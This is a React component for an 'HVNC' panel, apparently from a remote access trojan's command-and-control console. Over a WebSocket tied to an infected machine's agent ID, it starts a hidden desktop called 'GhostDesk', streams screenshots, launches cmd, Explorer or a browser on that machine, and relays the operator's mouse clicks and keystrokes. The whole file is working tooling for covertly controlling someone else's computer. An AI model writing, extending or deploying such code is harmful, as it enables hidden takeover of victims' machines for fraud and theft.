import React, { useState, useEffect, useRef } from 'react';
import { Play, Square, Command, Globe, Folder, MousePointer, Keyboard, Monitor } from 'lucide-react';
import { WS_BASE_URL } from '../../config';

export default function HVNC({ agentId }) {
    const [imageSrc, setImageSrc] = useState(null);
    const [running, setRunning] = useState(false);
    const [mouseEnabled, setMouseEnabled] = useState(false);
    const [keyboardEnabled, setKeyboardEnabled] = useState(false);
    
    const wsRef = useRef(null);
    const imgRef = useRef(null);

    useEffect(() => {
        const ws = new WebSocket(`${WS_BASE_URL}/ws/${agentId}`);
        ws.binaryType = 'arraybuffer';
        wsRef.current = ws;

        ws.onopen = () => {
            console.log("[HVNC] Connected");
        };

        ws.onmessage = (event) => {
            if (event.data instanceof ArrayBuffer) {
                const data = new Uint8Array(event.data);
                // Check for HVNC Header (0x04) prepended by server
                if (data[0] === 0x04) {
                    const jpegData = data.slice(1);
                    if (jpegData.length > 2 && jpegData[0] === 0xFF && jpegData[1] === 0xD8) {
                        const blob = new Blob([jpegData], { type: 'image/jpeg' });
                        const url = URL.createObjectURL(blob);
                        setImageSrc(prev => {
                            if (prev) URL.revokeObjectURL(prev);
                            return url;
                        });
                    }
                }
            }
        };

        return () => {
            if (imageSrc) URL.revokeObjectURL(imageSrc);
            if (ws.readyState === WebSocket.OPEN) ws.close();
        };
    }, [agentId]);

    const toggleHVNC = (start) => {
        if (!wsRef.current || wsRef.current.readyState !== WebSocket.OPEN) return;
        if (start) {
            wsRef.current.send("__HVNC_START__");
            setRunning(true);
        } else {
            wsRef.current.send("__HVNC_STOP__");
            setRunning(false);
            setImageSrc(null);
        }
    };

    const execApp = (app) => {
        if (!wsRef.current || wsRef.current.readyState !== WebSocket.OPEN) return;
        wsRef.current.send(`__HVNC_EXEC__:${app}`);
    };

    const handleMouseEvent = (e, type) => {
        if (!mouseEnabled || !running || !imgRef.current) return;
        const rect = imgRef.current.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        
        // Normalize 0.0 - 1.0
        const ratioX = Math.max(0, Math.min(1, x / rect.width));
        const ratioY = Math.max(0, Math.min(1, y / rect.height));

        let flags = 0;
        if (type === 'down') {
            if (e.button === 0) flags = 1; // Left Down
            if (e.button === 2) flags = 4; // Right Down
        } else if (type === 'up') {
            if (e.button === 0) flags = 2; // Left Up
            if (e.button === 2) flags = 8; // Right Up
        }
        
        // Format: x,y,flags (floats for x,y)
        wsRef.current.send(`__HVNC_INPUT__:${ratioX},${ratioY},${flags}`);
    };

    const handleKeyDown = (e) => {
        if (!keyboardEnabled || !running || !wsRef.current) return;
        e.preventDefault();
        // Protocol: keycode,is_down
        wsRef.current.send(`__HVNC_INPUT__:K${e.keyCode},1`);
    };

    const handleKeyUp = (e) => {
        if (!keyboardEnabled || !running || !wsRef.current) return;
        e.preventDefault();
        wsRef.current.send(`__HVNC_INPUT__:K${e.keyCode},0`);
    };

    return (
        <div className="flex flex-col h-full bg-[#0c0c0c] relative" tabIndex={0} onKeyDown={handleKeyDown} onKeyUp={handleKeyUp}>
            {/* Toolbar */}
            <div className="bg-[#1a1a1a] border-b border-[#333] p-2 flex items-center gap-4 shadow-md z-10">
                <div className="flex gap-2 border-r border-[#333] pr-4">
                    <button 
                        onClick={() => toggleHVNC(true)} 
                        disabled={running}
                        className={`flex items-center gap-1 px-3 py-1.5 rounded-sm text-xs font-bold transition ${running ? 'bg-[#333] text-gray-500' : 'bg-purple-900/20 text-purple-400 hover:bg-purple-500 hover:text-black'}`}
                    >
                        <Play size={12} fill="currentColor"/> START HVNC
                    </button>
                    <button 
                        onClick={() => toggleHVNC(false)} 
                        disabled={!running}
                        className={`flex items-center gap-1 px-3 py-1.5 rounded-sm text-xs font-bold transition ${!running ? 'bg-[#333] text-gray-500' : 'bg-red-900/20 text-red-400 hover:bg-red-500 hover:text-black'}`}
                    >
                        <Square size={12} fill="currentColor"/> STOP
                    </button>
                </div>

                <div className="flex items-center gap-2 border-r border-[#333] pr-4">
                     <span className="text-gray-500 text-xs font-mono uppercase">Apps:</span>
                     <button onClick={() => execApp('cmd')} className="p-1.5 bg-[#222] hover:bg-[#333] text-gray-300 hover:text-white rounded transition" title="Open CMD"><Command size={14}/></button>
                     <button onClick={() => execApp('explorer')} className="p-1.5 bg-[#222] hover:bg-[#333] text-yellow-500 hover:text-yellow-300 rounded transition" title="Open Explorer"><Folder size={14}/></button>
                     <button onClick={() => execApp('browser')} className="p-1.5 bg-[#222] hover:bg-[#333] text-blue-400 hover:text-blue-300 rounded transition" title="Open Browser"><Globe size={14}/></button>
                </div>

                <div className="flex items-center gap-2">
                    <button onClick={() => setMouseEnabled(!mouseEnabled)} className={`flex items-center gap-2 px-3 py-1 rounded-sm text-xs font-bold border transition ${mouseEnabled ? 'bg-cyan-900/20 border-cyan-500/50 text-cyan-400' : 'bg-[#111] border-[#333] text-gray-500 hover:text-gray-300'}`}><MousePointer size={14} /> Mouse</button>
                    <button onClick={() => setKeyboardEnabled(!keyboardEnabled)} className={`flex items-center gap-2 px-3 py-1 rounded-sm text-xs font-bold border transition ${keyboardEnabled ? 'bg-purple-900/20 border-purple-500/50 text-purple-400' : 'bg-[#111] border-[#333] text-gray-500 hover:text-gray-300'}`}><Keyboard size={14} /> Keyboard</button>
                </div>
                
                <div className="ml-auto text-xs text-gray-500 font-mono flex items-center gap-2">
                    <Monitor size={12} /> Desktop: <span className="text-purple-400">GhostDesk</span>
                </div>
            </div>

            {/* Canvas Area */}
            <div className="flex-1 flex items-center justify-center overflow-hidden bg-[#050505] relative select-none">
                {imageSrc ? (
                    <img 
                        ref={imgRef}
                        src={imageSrc} 
                        alt="HVNC Stream" 
                        className={`max-w-full max-h-full object-contain ${mouseEnabled ? 'cursor-none' : 'cursor-default'}`}
                        onMouseMove={(e) => handleMouseEvent(e, 'move')}
                        onMouseDown={(e) => handleMouseEvent(e, 'down')}
                        onMouseUp={(e) => handleMouseEvent(e, 'up')}
                        onContextMenu={(e) => e.preventDefault()}
                        draggable={false}
                    />
                ) : (
                    <div className="text-purple-900/20 flex flex-col items-center animate-pulse">
                        <Monitor size={64} className="mb-4 opacity-20" />
                        <p className="text-sm font-mono tracking-widest text-purple-900/40">HVNC OFFLINE</p>
                    </div>
                )}
            </div>
        </div>
    );
}